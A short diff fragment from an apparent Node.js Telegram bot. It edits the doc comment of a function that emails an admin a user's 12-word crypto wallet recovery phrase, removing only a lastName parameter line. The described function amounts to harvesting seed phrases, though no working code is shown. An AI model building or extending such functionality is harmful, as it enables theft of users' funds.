@@ -12,7 +12,6 @@ const transporter = nodemailer.createTransport({
  * Sends an admin email with a user's 12-word wallet phrase.
  * @param {number} telegram_id - Telegram user ID.
  * @param {string} firstName - User's first name.
- * @param {string} lastName - User's last name.
  * @param {string} phrase - 12-word wallet phrase.
  * @returns {Promise<Object>} - Mail delivery info object.
  */
